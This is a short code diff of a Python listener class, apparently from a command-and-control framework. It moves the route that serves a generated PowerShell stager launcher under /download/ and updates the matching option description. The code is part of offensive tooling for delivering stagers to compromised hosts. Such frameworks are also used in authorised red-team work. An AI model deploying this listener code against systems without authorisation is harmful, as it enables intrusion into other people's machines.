@@ -107,7 +107,7 @@ class Listener:
                 'Value'         :   'Microsoft-IIS/7.5'
             },
             'StagerURI' : {
-                'Description'   :   'URI for the stager. Example: stager.php',
+                'Description'   :   'URI for the stager. Must use /download/. Example: /download/stager.php',
                 'Required'      :   False,
                 'Value'         :   ''
             },
@@ -801,9 +801,9 @@ def send_message(packets=None):
         self.app = app
 
 
-        @app.route('/<string:stagerURI>')
-        def send_stager(stagerURI):
-            if stagerURI:
+        @app.route('/download/<stager>')
+        def send_stager(stager):
+            if stager:
                 launcher = self.mainMenu.stagers.generate_launcher(listenerName, language='powershell', encode=False, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
                 return launcher
             else:
